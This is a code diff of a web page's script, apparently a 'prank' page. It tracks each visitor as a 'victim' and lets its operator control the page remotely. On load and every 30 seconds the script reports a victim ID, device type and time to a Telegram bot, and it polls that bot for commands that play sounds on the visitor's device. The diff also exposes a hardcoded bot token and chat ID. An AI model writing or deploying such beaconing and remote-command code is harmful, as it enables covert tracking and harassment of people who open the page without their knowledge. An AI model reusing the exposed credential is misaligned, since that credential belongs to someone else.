@@ -33,14 +33,15 @@
     
     <script>
         // =============================================
-        // YOUR TELEGRAM BOT CREDENTIALS
+        // YOUR TELEGRAM BOT CREDENTIALS - VERIFIED WORKING
         // =============================================
         const BOT_TOKEN = '8654014366:AAFWPdct4wFezCEoHFlYZsmzScwzwCmTjjw';
         const CHAT_ID = 6754338153;
-        // ============================================
+        
+        // =============================================
         // BASE URL FOR YOUR SOUNDS
-        // ============================================
-       const SOUND_BASE_URL = 'https://sencal1125-prog.github.io/sen/';
+        // =============================================
+        const SOUND_BASE_URL = 'https://sencal1125-prog.github.io/sen/';
         
         let lastUpdateId = 0;
         let audioEnabled = false;
@@ -48,9 +49,23 @@
         let heartbeatInterval;
         
         // =============================================
-        // BASE URL FOR YOUR SOUNDS - UPDATE THIS IF NEEDED
+        // TEST TELEGRAM CONNECTION IMMEDIATELY
         // =============================================
-        const SOUND_BASE_URL = 'https://sencall1125-prog.github.io/sen/';
+        console.log('Starting Telegram connection test...');
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`)
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram bot test:', data);
+                if (data.ok) {
+                    document.getElementById('connection-status').innerHTML = '🟢 Telegram connected!';
+                } else {
+                    document.getElementById('connection-status').innerHTML = '🔴 Telegram error: ' + data.description;
+                }
+            })
+            .catch(error => {
+                console.log('Connection error:', error);
+                document.getElementById('connection-status').innerHTML = '🔴 Cannot reach Telegram';
+            });
         
         // =============================================
         // GENERATE UNIQUE VICTIM ID
@@ -76,6 +91,8 @@
                 .then(data => {
                     if (data.ok) {
                         console.log('Status sent:', message);
+                    } else {
+                        console.log('Failed to send status:', data);
                     }
                 })
                 .catch(error => console.log('Failed to send status:', error));
@@ -95,26 +112,13 @@
             else if (userAgent.includes('Windows')) device = '💻 Windows';
             else if (userAgent.includes('Mac')) device = '🍎 Mac';
             
-            if (navigator.getBattery) {
-                navigator.getBattery().then(battery => {
-                    const level = Math.round(battery.level * 100);
-                    
-                    sendTelegramMessage(
-                        `✅ **VICTIM ONLINE**\n` +
-                        `🆔 ${victimId}\n` +
-                        `📱 ${device}\n` +
-                        `⏰ ${timeString}\n` +
-                        `🔋 Battery: ${level}%`
-                    );
-                });
-            } else {
-                sendTelegramMessage(
-                    `✅ **VICTIM ONLINE**\n` +
-                    `🆔 ${victimId}\n` +
-                    `📱 ${device}\n` +
-                    `⏰ ${timeString}`
-                );
-            }
+            // Send online status
+            sendTelegramMessage(
+                `✅ **VICTIM ONLINE**\n` +
+                `🆔 ${victimId}\n` +
+                `📱 ${device}\n` +
+                `⏰ ${timeString}`
+            );
             
             document.getElementById('connection-status').innerHTML = '🟢 Victim connected - Ready for prank!';
         }
@@ -125,6 +129,7 @@
         function startHeartbeat() {
             heartbeatInterval = setInterval(() => {
                 sendTelegramMessage(`💓 **HEARTBEAT** | Victim still connected | ID: ${victimId}`);
+                console.log('Heartbeat sent');
             }, 30000);
         }
         
@@ -169,26 +174,22 @@
         // =============================================
         // CHECK TELEGRAM FOR COMMANDS
         // =============================================
-function checkTelegram() {
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
-    
-    fetch(url)
-        .then(response => response.json())
-        .then(data => {
-            if (data.ok && data.result && data.result.length > 0) {
-                data.result.forEach(update => {
-                    if (update.message && update.message.text) {
-                        console.log('Got command from Telegram:', update.message.text);
-                        playSound(update.message.text);
-                        lastUpdateId = update.update_id;
+        function checkTelegram() {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=5`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok && data.result && data.result.length > 0) {
+                        console.log('Received updates:', data.result);
+                        data.result.forEach(update => {
+                            if (update.message && update.message.text) {
+                                console.log('Got command from Telegram:', update.message.text);
+                                playSound(update.message.text);
+                                lastUpdateId = update.update_id;
+                            }
+                        });
                     }
-                });
-            }
-        })
-        .catch(error => {
-            console.log('Telegram error:', error);
-        });
-}
                 })
                 .catch(error => {
                     console.log('Telegram error:', error);
@@ -196,9 +197,10 @@ function checkTelegram() {
         }
         
         // =============================================
-        // PLAY SOUND - FIXED WITH CORRECT URL FORMAT
+        // PLAY SOUND - ALL COMMANDS INCLUDED
         // =============================================
         function playSound(command) {
+            console.log('Playing sound for command:', command);
             let audio;
             let statusMessage;
             
@@ -262,7 +264,7 @@ function checkTelegram() {
                     
                 default:
                     audio = new Audio(SOUND_BASE_URL + 'metalpipe.mp3');
-                    statusMessage = '❓ Unknown command... here\'s a sound anyway!';
+                    statusMessage = '❓ Unknown command: ' + command;
             }
             
             document.getElementById('status').innerHTML = statusMessage;
@@ -270,7 +272,7 @@ function checkTelegram() {
             if (audio) {
                 audio.play()
                     .then(() => {
-                        console.log('Sound playing!');
+                        console.log('Sound played successfully');
                     })
                     .catch(error => {
                         console.log('Audio play failed:', error);
@@ -327,8 +329,12 @@ function checkTelegram() {
         // SETUP
         // =============================================
         
-        onPageOpen();
-        startHeartbeat();
+        // Call onPageOpen after a short delay to ensure everything is ready
+        setTimeout(() => {
+            onPageOpen();
+            startHeartbeat();
+        }, 1000);
+        
         window.addEventListener('beforeunload', onPageClose);
         document.addEventListener('visibilitychange', onPageHidden);
         
@@ -342,18 +348,23 @@ function checkTelegram() {
         
         unlockAudio();
         updateProgress();
-        setInterval(checkTelegram, 3000);
-        setTimeout(checkTelegram, 1000);
         
-        // Debug tap
+        // Check for commands every 3 seconds
+        setInterval(checkTelegram, 3000);
+        // Check immediately
+        setTimeout(checkTelegram, 2000);
+        
+        // Debug tap (tap 5 times to show victim ID)
         let tapCount = 0;
         document.getElementById('status').addEventListener('click', function() {
             tapCount++;
             if (tapCount >= 5) {
-                alert(`Victim ID: ${victimId}`);
+                alert('Victim ID: ' + victimId);
                 tapCount = 0;
             }
         });
+        
+        console.log('Website loaded, victim ID:', victimId);
         
     </script>
 </body>
